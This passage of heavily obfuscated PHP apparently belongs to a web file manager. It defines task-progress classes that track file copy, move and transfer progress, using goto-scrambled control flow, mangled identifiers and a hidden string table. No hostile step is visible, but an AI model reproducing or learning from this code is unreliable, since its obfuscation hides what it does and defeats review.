$B„†°‚Ô÷­[1428] => timeFloat(), $B„†°‚Ô÷­[1429] => 0, $B„†°‚Ô÷­[1430] => 0, $B„†°‚Ô÷­[1431] => 0, $B„†°‚Ô÷­[1432] => 0, $B„†°‚Ô÷­[679] => $B„†°‚Ô÷­[1389]); goto bãÌŒÉ¶Ñ±; bãÌŒÉ¶Ñ±: Hook::bind($B„†°‚Ô÷­[1391], array($this, $B„†°‚Ô÷­[1433])); Hook::bind($B„†°‚Ô÷­[1434], array($this, $B„†°‚Ô÷­[1435])); $this->startAfter(); goto dõÄÇÒßÇØ; dõÄÇÒßÇØ: Hook::trigger($B„†°‚Ô÷­[1436], $this->task); $this->task[$B„†°‚Ô÷­[1430]] = timeFloat(); goto AæˆÉÉŒ¹¢; AæˆÉÉŒ¹¢: } public function end() { goto aˆ¤ÆÌãéË; Fã¸¡èƒÍ: Hook::unbind($Fïñ¾”´´õ[1434], array($this, $Fïñ¾”´´õ[1435])); $this->endAfter(); $this->task = !1; goto AÔÓÚï¥¢¬; aˆ¤ÆÌãéË: $Fïñ¾”´´õ =& $_SERVER[¨¤¼…´]; if (!$this->task) { return; } if ($this->task[$Fïñ¾”´´õ[1430]]) { self::valueSet($this->task[$Fïñ¾”´´õ[379]], !1); } goto aŞíÀî•ÂŸ; aŞíÀî•ÂŸ: $B„õ¯‚ùÔÄ = timeFloat() - $this->task[$Fïñ¾”´´õ[1428]]; self::log($Fïñ¾”´´õ[1437] . $this->task[$Fïñ¾”´´õ[379]] . $Fïñ¾”´´õ[1438] . $B„õ¯‚ùÔÄ . $Fïñ¾”´´õ[1439]); Hook::unbind($Fïñ¾”´´õ[1391], array($this, $Fïñ¾”´´õ[1433])); goto Fã¸¡èƒÍ; AÔÓÚï¥¢¬: } public function update($cà…†ˆƒ‡ = 0, $d©ù¹Á’–Æ = false) { goto c‡ë¿ä›“; bø‘‚â­ÀÁ: $EÙë†÷„®[$F®‡ÎÕ°ß[977]] += $cà…†ˆƒ‡; $EÙë†÷„®[$F®‡ÎÕ°ß[1429]] = timeFloat(); if ($EÙë†÷„®[$F®‡ÎÕ°ß[963]]) { if ($EÙë†÷„®[$F®‡ÎÕ°ß[963]] < $EÙë†÷„®[$F®‡ÎÕ°ß[977]]) { $EÙë†÷„®[$F®‡ÎÕ°ß[963]] = $EÙë†÷„®[$F®‡ÎÕ°ß[977]]; } $aÖ²Û°¯¦’ = timeFloat() - $EÙë†÷„®[$F®‡ÎÕ°ß[1428]] - $EÙë†÷„®[$F®‡ÎÕ°ß[1431]]; $EÙë†÷„®[$F®‡ÎÕ°ß[1426]] = $EÙë†÷„®[$F®‡ÎÕ°ß[977]] / $EÙë†÷„®[$F®‡ÎÕ°ß[963]]; $EÙë†÷„®[$F®‡ÎÕ°ß[1427]] = $EÙë†÷„®[$F®‡ÎÕ°ß[977]] / $aÖ²Û°¯¦’; if ($EÙë†÷„®[$F®‡ÎÕ°ß[1426]] > 0) { $EÙë†÷„®[$F®‡ÎÕ°ß[1432]] = $aÖ²Û°¯¦’ * (1 - $EÙë†÷„®[$F®‡ÎÕ°ß[1426]]) / $EÙë†÷„®[$F®‡ÎÕ°ß[1426]]; } $EÙë†÷„®[$F®‡ÎÕ°ß[1432]] = $EÙë†÷„®[$F®‡ÎÕ°ß[1432]] <= 0 ? 0 : $EÙë†÷„®[$F®‡ÎÕ°ß[1432]]; } goto d•é‘£ìÔ; c‡ë¿ä›“: $F®‡ÎÕ°ß =& $_SERVER[¨¤¼…´]; $EÙë†÷„® =& $this->task; if (!$EÙë†÷„®) { return; } goto bø‘‚â­ÀÁ; AŞ­”ÌÍÀ: Hook::trigger($F®‡ÎÕ°ß[1443], $EÙë†÷„®); self::valueSet($EÙë†÷„®[$F®‡ÎÕ°ß[379]], $EÙë†÷„®); goto Bå¸®œÙæá; D†šàõ·¾”: $bï›ÑğĞŒ = self::get($EÙë†÷„®[$F®‡ÎÕ°ß[379]]); $e‰«ÊƒàÈ« = $bï›ÑğĞŒ[$F®‡ÎÕ°ß[679]]; if ($e‰«ÊƒàÈ« == self::STATYS_KILL) { $FÙæƒ§Â¢¦ = array($F®‡ÎÕ°ß[1440] => LNG($F®‡ÎÕ°ß[1441]), $F®‡ÎÕ°ß[1023] => !1); Cache::set($F®‡ÎÕ°ß[1442] . $this->task[$F®‡ÎÕ°ß[379]], $FÙæƒ§Â¢¦, 30); $this->end(); die; } else { if ($e‰«ÊƒàÈ« == self::STATYS_STOP) { $C¶ã¼Š–é  = 2; $bï›ÑğĞŒ[$F®‡ÎÕ°ß[1431]] += $C¶ã¼Š–é ; self::valueSet($EÙë†÷„®[$F®‡ÎÕ°ß[379]], $bï›ÑğĞŒ); sleep($C¶ã¼Š–é ); $this->update(); return; } } goto D¡åƒÌ…¯; d•é‘£ìÔ: $this->updateAfter(); $E¤²‘Ã¥‡º = 0.2; if (timeFloat() - $EÙë†÷„®[$F®‡ÎÕ°ß[1430]] < $E¤²‘Ã¥‡º && !$d©ù¹Á’–Æ) { return; } goto D†šàõ·¾”; D¡åƒÌ…¯: $EÙë†÷„®[$F®‡ÎÕ°ß[679]] = $e‰«ÊƒàÈ« ? $e‰«ÊƒàÈ« : $EÙë†÷„®[$F®‡ÎÕ°ß[679]]; $EÙë†÷„®[$F®‡ÎÕ°ß[1431]] = $bï›ÑğĞŒ[$F®‡ÎÕ°ß[1431]] ? $bï›ÑğĞŒ[$F®‡ÎÕ°ß[1431]] : 0; $EÙë†÷„®[$F®‡ÎÕ°ß[1430]] = timeFloat(); goto AŞ­”ÌÍÀ; Bå¸®œÙæá: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fÓ•õº…“ä) { $bÂ’µó‘² =& $_SERVER[¨¤¼…´]; Cache::set($bÂ’µó‘²[1442] . $this->task[$bÂ’µó‘²[379]], $fÓ•õº…“ä, 60); return $fÓ•õº…“ä; } public static function get($B°¿ê²ñ—¬) { return self::valueGet($B°¿ê²ñ—¬); } public static function listData() { $aÂ ñäÍ„Î = self::valueGet(); return array_sort_by($aÂ ñäÍ„Î, $_SERVER[¨¤¼…´][1428], !0); } public static function kill($dïˆÓùÓî) { return self::changeStatus($dïˆÓùÓî, self::STATYS_KILL); } public static function stop($b©ƒóÖï±¿) { return self::changeStatus($b©ƒóÖï±¿, self::STATYS_STOP); } public static function restart($fã×é™³¨ª) { return self::changeStatus($fã×é™³¨ª, self::STATYS_RUNNING); } public static function killAll() { $cÂŠÄâ¨¥Á =& $_SERVER[¨¤¼…´]; $DÈ—æå‚èƒ = self::listData(); foreach ($DÈ—æå‚èƒ as $AìÃ“ƒ’à) { self::kill($AìÃ“ƒ’à[$cÂŠÄâ¨¥Á[379]]); } sleep(2); foreach ($DÈ—æå‚èƒ as $AìÃ“ƒ’à) { self::valueSet($AìÃ“ƒ’à[$cÂŠÄâ¨¥Á[379]], !1); } } private static function changeStatus($E´äÙ£¡ á, $Bª¦éä‹¥õ) { goto E‡øÑõÉò; E‡øÑõÉò: $AÆ¸·š =& $_SERVER[¨¤¼…´]; $cãøëîö§÷ = self::valueGet($E´äÙ£¡ á); if (!$cãøëîö§÷) { return !1; } goto fñĞİÃÈ÷ƒ; e§ £—šáó: return !0; goto C‡î Ï‰„©; fñĞİÃÈ÷ƒ: $cãøëîö§÷[$AÆ¸·š[679]] = $Bª¦éä‹¥õ; self::valueSet($E´äÙ£¡ á, $cãøëîö§÷); self::log($AÆ¸·š[1444] . $cãøëîö§÷[$AÆ¸·š[379]] . $AÆ¸·š[1445] . $Bª¦éä‹¥õ); goto e§ £—šáó; C‡î Ï‰„©: } public static function valueGet($a¤ª ğä´ = false) { $CŞœ“·„›õ =& $_SERVER[¨¤¼…´]; if ($a¤ª ğä´) { $aÔ…®¢Ïé = Model($CŞœ“·„›õ[411])->where(array($CŞœ“·„›õ[99] => $a¤ª ğä´, $CŞœ“·„›õ[39] => $CŞœ“·„›õ[1446]))->find(); return $aÔ…®¢Ïé ? json_decode($aÔ…®¢Ïé[$CŞœ“·„›õ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($dƒ›ä‡­¿î = false) { goto f‰Æœ—¨§‚; bØßÔöö±: $d’§ÂöÜ™“ = Model($bÀÑŞâÔØ[411])->where($A™¯ÊÈÚ–Í)->select(); $d’§ÂöÜ™“ = $d’§ÂöÜ™“ ? $d’§ÂöÜ™“ : array(); foreach ($d’§ÂöÜ™“ as $DİÉ¢Ó¾è÷ => $D ¡¦ÊŒïì) { $d’§ÂöÜ™“[$DİÉ¢Ó¾è÷] = json_decode($D ¡¦ÊŒïì[$bÀÑŞâÔØ[372]], !0); } goto d§ù§ìÏ˜ ; d§ù§ìÏ˜ : return $d’§ÂöÜ™“; goto C¯³Ì¿ğà×; f‰Æœ—¨§‚: $bÀÑŞâÔØ =& $_SERVER[¨¤¼…´]; $A™¯ÊÈÚ–Í = array($bÀÑŞâÔØ[39] => $bÀÑŞâÔØ[1446]); if ($dƒ›ä‡­¿î) { $A™¯ÊÈÚ–Í[$bÀÑŞâÔØ[1425]] = $dƒ›ä‡­¿î; } goto bØßÔöö±; C¯³Ì¿ğà×: } public static function valueSet($cÆ—Ë‹Ï, $cµÛ¨ºŒ) { goto dãŠáéÜê ; c½ŞáÚÍ: Model($C»ƒ½ÕŸÔÎ[411])->add($d…Šì¹İÚ, array(), !0); goto D›¿ÌºÅÇ¹; dãŠáéÜê : $C»ƒ½ÕŸÔÎ =& $_SERVER[¨¤¼…´]; if (!$cµÛ¨ºŒ) { return Model($C»ƒ½ÕŸÔÎ[411])->where(array($C»ƒ½ÕŸÔÎ[99] => $cÆ—Ë‹Ï, $C»ƒ½ÕŸÔÎ[39] => $C»ƒ½ÕŸÔÎ[1446]))->delete(); } $B½šù‡Õ» = json_encode($cµÛ¨ºŒ); goto eÛÖ”ËŸ; eÛÖ”ËŸ: if (!$B½šù‡Õ») { ob_start(); var_dump($cµÛ¨ºŒ); $F†•Ï£ù¢‰ = ob_get_clean(); self::log($C»ƒ½ÕŸÔÎ[1447] . json_encode_force($F†•Ï£ù¢‰)); } if (!$cÆ—Ë‹Ï || !$cµÛ¨ºŒ[$C»ƒ½ÕŸÔÎ[379]]) { return !1; } $d…Šì¹İÚ = array($C»ƒ½ÕŸÔÎ[39] => $C»ƒ½ÕŸÔÎ[1446], $C»ƒ½ÕŸÔÎ[1425] => USER_ID, $C»ƒ½ÕŸÔÎ[99] => $cÆ—Ë‹Ï, $C»ƒ½ÕŸÔÎ[372] => $B½šù‡Õ»); goto c½ŞáÚÍ; D›¿ÌºÅÇ¹: } public static function log($FÂÁàœ©ƒ) { write_log($FÂÁàœ©ƒ, $_SERVER[¨¤¼…´][1448]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Cİäèéà”; Cİäèéà”: $cŠîƒƒ’˜‰ =& $_SERVER[¨¤¼…´]; $F–©²³Ş¤° =& $this->task; $this->sourceCopyFolder = !1; goto Eó¢æ©¹; bĞÉ™‰ÃÊ: $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1474]] = 0; $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1475]] = 0; if (!$F–©²³Ş¤°[$cŠîƒƒ’˜‰[1331]]) { $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1331]] = LNG($cŠîƒƒ’˜‰[1476]); } goto Eƒ”Èƒ¢Òé; fÁùÇëĞ‘ß: $F–©²³Ş¤°[$cŠîƒƒ’˜‰[965]] = $cŠîƒƒ’˜‰[43]; $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1472]] = $cŠîƒƒ’˜‰[43]; $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1473]] = 0; goto bĞÉ™‰ÃÊ; DñË‹ÈÅšƒ: Hook::bind($cŠîƒƒ’˜‰[551], array($this, $cŠîƒƒ’˜‰[1455])); Hook::bind($cŠîƒƒ’˜‰[552], array($this, $cŠîƒƒ’˜‰[1456])); Hook::bind($cŠîƒƒ’˜‰[554], array($this, $cŠîƒƒ’˜‰[1457])); goto bõÀ„ôÂË; Eó¢æ©¹: Hook::bind($cŠîƒƒ’˜‰[1449], array($this, $cŠîƒƒ’˜‰[1450])); Hook::bind($cŠîƒƒ’˜‰[1451], array($this, $cŠîƒƒ’˜‰[1452])); Hook::bind($cŠîƒƒ’˜‰[1453], array($this, $cŠîƒƒ’˜‰[1454])); goto DñË‹ÈÅšƒ; D®µ·µš­Æ: Hook::bind($cŠîƒƒ’˜‰[524], array($this, $cŠîƒƒ’˜‰[1458])); Hook::bind($cŠîƒƒ’˜‰[526], array($this, $cŠîƒƒ’˜‰[1458])); Hook::bind($cŠîƒƒ’˜‰[528], array($this, $cŠîƒƒ’˜‰[1458])); goto Aå‘İÄ¦; CƒÅÁÏÏ¯¬: $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1468]] = LNG($cŠîƒƒ’˜‰[1469]); $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1470]] = 0; $F–©²³Ş¤°[$cŠîƒƒ’˜‰[1471]] = 0; goto fÁùÇëĞ‘ß; bõÀ„ôÂË: Hook::bind($cŠîƒƒ’˜‰[555], array($this, $cŠîƒƒ’˜‰[1457])); Hook::bind($cŠîƒƒ’˜‰[522], array($this, $cŠîƒƒ’˜‰[1458])); Hook::bind($cŠîƒƒ’˜‰[519], array($this, $cŠîƒƒ’˜‰[1458])); goto D®µ·µš­Æ; B¶‚‡ìË: Hook::bind($cŠîƒƒ’˜‰[1462], array($this, $cŠîƒƒ’˜‰[1463])); Hook::bind($cŠîƒƒ’˜‰[1464], array($this, $cŠîƒƒ’˜‰[1465])); Hook::bind($cŠîƒƒ’˜‰[1466], array($this, $cŠîƒƒ’˜‰[1467])); goto CƒÅÁÏÏ¯¬; Aå‘İÄ¦: Hook::bind($cŠîƒƒ’˜‰[1459], array($this, $cŠîƒƒ’˜‰[1460])); Hook::bind($cŠîƒƒ’˜‰[544], array($this, $cŠîƒƒ’˜‰[1461])); $this->sourceModelCopyFlag = !1; goto B¶‚‡ìË; Eƒ”Èƒ¢Òé: } protected function endAfter() { goto D‡ø‰·Åõ‰; B õâñ°è: Hook::unbind($B­ŠŞ¼©Ò[519], array($this, $B­ŠŞ¼©Ò[1458])); Hook::unbind($B­ŠŞ¼©Ò[524], array($this, $B­ŠŞ¼©Ò[1458])); Hook::unbind($B­ŠŞ¼©Ò[526], array($this, $B­ŠŞ¼©Ò[1458])); goto FèË›‚øÎ¢; E¹¶¤º×³Ş: Hook::unbind($B­ŠŞ¼©Ò[1462], array($this, $B­ŠŞ¼©Ò[1463])); Hook::unbind($B­ŠŞ¼©Ò[1464], array($this, $B­ŠŞ¼©Ò[1465])); Hook::unbind($B­ŠŞ¼©Ò[1466], array($this, $B­ŠŞ¼©Ò[1467])); goto AÔ½Ü²‡ï‡; C »äßï™: Hook::unbind($B­ŠŞ¼©Ò[1453], array($this, $B­ŠŞ¼©Ò[1454])); Hook::unbind($B­ŠŞ¼©Ò[551], array($this, $B­ŠŞ¼©Ò[1455])); Hook::unbind($B­ŠŞ¼©Ò[552], array($this, $B­ŠŞ¼©Ò[1456])); goto f‚Éõ”½³; f‚Éõ”½³: Hook::unbind($B­ŠŞ¼©Ò[554], array($this, $B­ŠŞ¼©Ò[1457])); Hook::unbind($B­ŠŞ¼©Ò[555], array($this, $B­ŠŞ¼©Ò[1457])); Hook::unbind($B­ŠŞ¼©Ò[522], array($this, $B­ŠŞ¼©Ò[1458])); goto B õâñ°è; D‡ø‰·Åõ‰: $B­ŠŞ¼©Ò =& $_SERVER[¨¤¼…´]; Hook::unbind($B­ŠŞ¼©Ò[1449], array($this, $B­ŠŞ¼©Ò[1450])); Hook::unbind($B­ŠŞ¼©Ò[1451], array($this, $B­ŠŞ¼©Ò[1452])); goto C »äßï™; FèË›‚øÎ¢: Hook::unbind($B­ŠŞ¼©Ò[528], array($this, $B­ŠŞ¼©Ò[1458])); Hook::unbind($B­ŠŞ¼©Ò[1459], array($this, $B­ŠŞ¼©Ò[1460])); Hook::unbind($B­ŠŞ¼©Ò[544], array($this, $B­ŠŞ¼©Ò[1461])); goto E¹¶¤º×³Ş; AÔ½Ü²‡ï‡: } public function copyMoveStart($B×Ğ‹ŒŞ™, $BæëÂĞÕÂ, $BÀ¦£åÑ…Ş, $Dùç¥„ì¨ğ) { goto a›¾ñ±ÓÑµ; a›¾ñ±ÓÑµ: $Fµ™é®õ”¨ =& $_SERVER[¨¤¼…´]; self::log($Fµ™é®õ”¨[1477] . $BæëÂĞÕÂ . $Fµ™é®õ”¨[76] . $Dùç¥„ì¨ğ); $D¤ºå‚¿Ñ° = rtrim(TEMP_FILES, $Fµ™é®õ”¨[8]); goto eÆŠ­ğ•œ; aÍÚóÜ¦š: $F™ÁÌğ¦©Ö[$Fµ™é®õ”¨[1478]] = KodIO::transferType($B×Ğ‹ŒŞ™, $BÀ¦£åÑ…Ş); $this->update(); goto eğÊ—ÈË‰À; eÆŠ­ğ•œ: if (substr($BæëÂĞÕÂ, 0, strlen($D¤ºå‚¿Ñ°)) == $D¤ºå‚¿Ñ°) { return; } if (substr($Dùç¥„ì¨ğ, 0, strlen($D¤ºå‚¿Ñ°)) == $D¤ºå‚¿Ñ°) { return; } $F™ÁÌğ¦©Ö =& $this->task; goto aÍÚóÜ¦š; eğÊ—ÈË‰À: } public function updateAfter() { goto aéñ’ğ ù; C¡øßçĞàñ: $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1426]] = $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1475]] / $A­åõ¦çˆò[$BÕŒÁæ˜è¯[688]]; if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1426]] > 0) { $AÑïß¡çá‰ = timeFloat() - $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1428]] - $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1431]]; $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1432]] = $AÑïß¡çá‰ * (1 - $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1426]]) / $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1426]]; } goto a¦Ô³ßÈé; A‚ØÂÙ÷ÜÂ: if ($this->sourceModelCopyFlag) { return; } if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1478]] == $BÕŒÁæ˜è¯[1084]) { return; } if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1478]] == $BÕŒÁæ˜è¯[1031] || $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1478]] == $BÕŒÁæ˜è¯[113]) { if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1472]]) { $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1475]] = $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1474]] + $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1471]]; } } else { if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1478]] == $BÕŒÁæ˜è¯[1085]) { if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1472]] == $BÕŒÁæ˜è¯[1031]) { $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1475]] = $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1474]] + $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1471]] * 0.5; } else { if ($A­åõ¦çˆò[$BÕŒÁæ˜è¯[1472]] == $BÕŒÁæ˜è¯[113]) { $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1475]] = $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1474]] + $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1470]] * 0.5 + $A­åõ¦çˆò[$BÕŒÁæ˜è¯[1471]] * 0.5; } } } } goto C¡øßçĞàñ; aéñ’ğ ù: $BÕŒÁæ˜è¯ =& $_SERVER[¨¤¼…´]; $A­åõ¦çˆò =& $this->task; if (!$A­åõ¦çˆò[$BÕŒÁæ˜è¯[688]]) { return; } goto A‚ØÂÙ÷ÜÂ; a¦Ô³ßÈé: } public function addPath($DŒÄª­ˆ•Ş) { goto CæèÉÍÇİ; CæèÉÍÇİ: $C„÷¹¦Šæ =& $_SERVER[¨¤¼…´]; if (!$DŒÄª­ˆ•Ş) { return; } $eéİŠ‰Ì á =& $this->task; goto d²ã¾¬§ƒ; aØÆšˆÏ¾†: if ($b’¿²³Ù™[$C„÷¹¦Šæ[39]] == $C„÷¹¦Šæ[181]) { $eéİŠ‰Ì á[$C„÷¹¦Šæ[963]] += 1; } else { $eéİŠ‰Ì á[$C„÷¹¦Šæ[963]] += $b’¿²³Ù™[$C„÷¹¦Šæ[90]][$C„÷¹¦Šæ[88]]; if ($b’¿²³Ù™[$C„÷¹¦Šæ[381]]) { $eéİŠ‰Ì á[$C„÷¹¦Šæ[963]] += $b’¿²³Ù™[$C„÷¹¦Šæ[90]][$C„÷¹¦Šæ[89]] + 1; } } $eéİŠ‰Ì á[$C„÷¹¦Šæ[688]] += $b’¿²³Ù™[$C„÷¹¦Šæ[87]]; $this->update(); goto cé¸®¦çŠÓ; d²ã¾¬§ƒ: $b’¿²³Ù™ = IO::infoWithChildren($DŒÄª­ˆ•Ş); $cÉãŸ¸õÆ = $eéİŠ‰Ì á[$C„÷¹¦Šæ[1479]] ? $eéİŠ‰Ì á[$C„÷¹¦Šæ[1479]][$C„÷¹¦Šæ[1480]] : 0; $eéİŠ‰Ì á[$C„÷¹¦Šæ[1479]] = array($C„÷¹¦Šæ[1480] => $cÉãŸ¸õÆ + 1, $C„÷¹¦Šæ[398] => $b’¿²³Ù™[$C„÷¹¦Šæ[38]], $C„÷¹¦Šæ[85] => $b’¿²³Ù™[$C„÷¹¦Šæ[85]], $C„÷¹¦Šæ[479] => $b’¿²³Ù™[$C„÷¹¦Šæ[479]] ? $b’¿²³Ù™[$C„÷¹¦Šæ[479]] : $b’¿²³Ù™[$C„÷¹¦Šæ[85]]); goto aØÆšˆÏ¾†; cé¸®¦çŠÓ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($EË–·‚—º) { $a¿ƒÓ¤º†Ÿ =& $_SERVER[¨¤¼…´]; $d¬©öÒ†  =& $this->task; $d¬©öÒ† [$a¿ƒÓ¤º†Ÿ[1468]] = $EË–·‚—º[$a¿ƒÓ¤º†Ÿ[38]]; $d¬©öÒ† [$a¿ƒÓ¤º†Ÿ[965]] = $EË–·‚—º[$a¿ƒÓ¤º†Ÿ[38]]; $this->update(); } public function copyFileStart($dÍ£æõ†øË, $AÓåÈççŸË, $F¬šªñ¹ÖË, $D„¼£ÕØÑÕ, $C¯Ñ ñÃ„¡, $eòæ×ŠãŸ) { goto C“““Í¹à; fÉ¥”¯¯Ø: $e§’Õ«ªš[$eèˆÊÇƒ‰[965]] = $eèˆÊÇƒ‰[43]; $e§’Õ«ªš[$eèˆÊÇƒ‰[1472]] = $eèˆÊÇƒ‰[43]; $e§’Õ«ªš[$eèˆÊÇƒ‰[1473]] = 0; goto FãâùÇïø; C“““Í¹à: $eèˆÊÇƒ‰ =& $_SERVER[¨¤¼…´]; $a§Íœ½áßñ = $C¯Ñ ñÃ„¡; if ($a§Íœ½áßñ == $GLOBALS[$eèˆÊÇƒ‰[1481]]) { $a§Íœ½áßñ = $GLOBALS[$eèˆÊÇƒ‰[1482]]; } goto BÙî¡˜®ªÙ; BÙî¡˜®ªÙ: $GLOBALS[$eèˆÊÇƒ‰[1482]] = $C¯Ñ ñÃ„¡; $GLOBALS[$eèˆÊÇƒ‰[1481]] = $eòæ×ŠãŸ; $e§’Õ«ªš =& $this->task; goto f‚ÉÜ˜Ûó»; FãâùÇïø: $this->update(); goto D¼ô“‡”ö¢; f‚ÉÜ˜Ûó»: $e§’Õ«ªš[$eèˆÊÇƒ‰[1468]] = $a§Íœ½áßñ; $e§’Õ«ªš[$eèˆÊÇƒ‰[1470]] = (int) $dÍ£æõ†øË->size($AÓåÈççŸË); $e§’Õ«ªš[$eèˆÊÇƒ‰[1471]] = 0; goto fÉ¥”¯¯Ø; D¼ô“‡”ö¢: } public function copyFileEnd($f±áÛ… •Ÿ, $bÂÙ”ó„İÁ, $E—©„áùÎ², $bª‹å‹®ËŠ, $eÃ–æŒ•“ª, $Fì±â¹åÏ¬) { $aØ–ğÎİ’ =& $_SERVER[¨¤¼…´]; $fŒ”òÎ³‹Ñ =& $this->task; $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1471]] = $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1470]]; $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1472]] = $aØ–ğÎİ’[43]; if ($eÃ–æŒ•“ª == $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1468]]) { $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1474]] += $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1470]]; $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1475]] = $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1474]]; $this->update(1); } else { $this->update(); $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1471]] = 0; } self::log($aØ–ğÎİ’[1483] . $bÂÙ”ó„İÁ . $aØ–ğÎİ’[76] . $bª‹å‹®ËŠ . $aØ–ğÎİ’[14] . $eÃ–æŒ•“ª . $aØ–ğÎİ’[1484] . $fŒ”òÎ³‹Ñ[$aØ–ğÎİ’[1468]]); } public function updateFileEnd($e˜ øÒÙÅ, $c—½µœÑ§) { goto bøš•‰äâ; F•…´¨¢š¨: $C‹Áè­ÄÄĞ[$B£ÅøğâÏ¦[1470]] = $c—½µœÑ§; $C‹Áè­ÄÄĞ[$B£ÅøğâÏ¦[1474]] += $c—½µœÑ§; $C‹Áè­ÄÄĞ[$B£ÅøğâÏ¦[1475]] = $C‹Áè­ÄÄĞ[$B£ÅøğâÏ¦[1474]]; goto dœ‚ ŒŒ¯—; dœ‚ ŒŒ¯—: $this->update(1); self::log($B£ÅøğâÏ¦[1485] . $e˜ øÒÙÅ); goto AéåÔôÙ; bøš•‰äâ: $B£ÅøğâÏ¦ =& $_SERVER[¨¤¼…´]; $C‹Áè­ÄÄĞ =& $this->task; $C‹Áè­ÄÄĞ[$B£ÅøğâÏ¦[1468]] = $e˜ øÒÙÅ; goto F•…´¨¢š¨; AéåÔôÙ: } public function sourceModelCopy($CŒ¶Œ˜ò˜) { goto D¨’î·ÆÔ´; D¨’î·ÆÔ´: $e²èÔÉ“àç =& $_SERVER[¨¤¼…´]; $cÁŒ£ÔÄ‹ø = $CŒ¶Œ˜ò˜[0]; $FƒÔôƒï† = $CŒ¶Œ˜ò˜[1]; goto fˆß‘¬–èˆ; eÑ·ÇñºÚ©: switch ($cÁŒ£ÔÄ‹ø) { case $e²èÔÉ“àç[520]: $CÉÁ×‚Ì²÷ = 1; break; case $e²èÔÉ“àç[523]: $D‹µÍ‡á½ê[$e²èÔÉ“àç[1468]] = $FƒÔôƒï†[$e²èÔÉ“àç[38]]; break; case $e²èÔÉ“àç[525]: $CÉÁ×‚Ì²÷ = intval($CŒ¶Œ˜ò˜[$e²èÔÉ“àç[375]] * 0.4); break; case $e²èÔÉ“àç[527]: $CÉÁ×‚Ì²÷ = intval($CŒ¶Œ˜ò˜[$e²èÔÉ“àç[375]] * 0.2); break; case $e²èÔÉ“àç[529]: $CÉÁ×‚Ì²÷ = intval($CŒ¶Œ˜ò˜[$e²èÔÉ“àç[375]] * 0.4); break; } $this->update($CÉÁ×‚Ì²÷); $this->sourceModelCopyFlag = !1; goto A“ÅŒˆ’áÒ; fˆß‘¬–èˆ: $D‹µÍ‡á½ê =& $this->task; $this->sourceModelCopyFlag = !0; $CÉÁ×‚Ì²÷ = 0; goto eÑ·ÇñºÚ©; A“ÅŒˆ’áÒ: } public function sourceRemove($aÀ£ƒ‚Úë, $EĞ²ˆÉš“×) { $eµ¯„ïÁ«· =& $_SERVER[¨¤¼…´]; $this->sourceModelCopyFlag = !0; $DØ³Ñ”ì´Å = 1; if (isset($aÀ£ƒ‚Úë[$eµ¯„ïÁ«·[90]])) { $DØ³Ñ”ì´Å = $aÀ£ƒ‚Úë[$eµ¯„ïÁ«·[90]][$eµ¯„ïÁ«·[88]] + $aÀ£ƒ‚Úë[$eµ¯„ïÁ«·[90]][$eµ¯„ïÁ«·[89]] + 1; } $this->update($DØ³Ñ”ì´Å); $this->sourceModelCopyFlag = !1; } public function sourceMove($E†­ÁÑµ’) { $this->sourceRemove($E†­ÁÑµ’, !1); } public function curlProgress($fÎİŠ×Ë¬¯, $fïğˆåã¬, $cÏÆ§²ŠåÜ, $Dßœí¸´Œù, $cÒ‘‹ĞŠÇç) { $eÅ„ØŞ˜­× =& $_SERVER[¨¤¼…´]; $EääŒ¨ëÂ° =& $this->task; if ($cÒ‘‹ĞŠÇç > 0) { $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[965]] = $eÅ„ØŞ˜­×[1486]; $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1472]] = $eÅ„ØŞ˜­×[113]; if ($EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1470]] == $Dßœí¸´Œù || $Dßœí¸´Œù > 1024 * 1024) { $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1471]] = $cÒ‘‹ĞŠÇç; } if ($EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1473]]) { $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1471]] = $cÒ‘‹ĞŠÇç + $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1473]]; } } else { if ($cÏÆ§²ŠåÜ > 0) { if 